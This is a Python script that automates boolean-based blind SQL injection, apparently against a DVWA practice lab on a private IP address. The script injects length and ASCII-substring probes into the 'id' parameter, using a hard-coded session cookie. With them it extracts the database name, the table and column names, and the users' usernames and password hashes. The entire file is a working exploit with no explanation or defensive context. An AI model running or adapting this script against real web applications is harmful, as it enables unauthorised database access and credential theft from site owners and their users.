#!/usr/bin/env python3

import requests
import sys

class BooleanBS:
    def __init__(self, url, cookie):
        self.url = url
        self.session = requests.Session()
        for item in cookie.split(';'):
            if '=' in item:
                key, value = item.strip().split('=', 1)
                self.session.cookies.set(key, value)
        self.true_flag = "User ID exists"
        
    def inject(self, payload):
        params = {'id': payload, 'Submit': 'Submit'}
        resp = self.session.get(self.url, params=params)
        return self.true_flag in resp.text
    
    def get_len(self, query):
        for l in range(1, 100):
            if self.inject(f"1' AND LENGTH(({query})) = {l} -- -"):
                return l
        return 0
    
    def get_char(self, query, pos):
        for c in range(32, 127):
            if self.inject(f"1' AND ASCII(SUBSTRING(({query}),{pos},1)) = {c} -- -"):
                return chr(c)
        return ''
    
    def extract(self, query):
        l = self.get_len(query)
        res = ''
        for i in range(1, l+1):
            res += self.get_char(query, i)
            print(f"[*] {res}")
        return res

def main():
    url = "http://192.168.0.103:8080/vulnerabilities/sqli_blind/"
    cookie = "PHPSESSID=rkf9pp7p6n8ua6qvvl8s092r05; security=low"
    
    sql = BooleanBS(url, cookie)
    
    db = sql.extract("SELECT database()")
    print(f"\n[+] database: {db}")
    
    tables = sql.extract(f"SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='{db}'")
    print(f"[+] tables: {tables}")
    
    users_cols = sql.extract(f"SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users' AND table_schema='{db}'")
    print(f"[+] users columns: {users_cols}")
    
    data = sql.extract(f"SELECT GROUP_CONCAT(user,':',password) FROM {db}.users")
    print(f"\n[+] users:\n{data}")

if __name__ == "__main__":
    main()
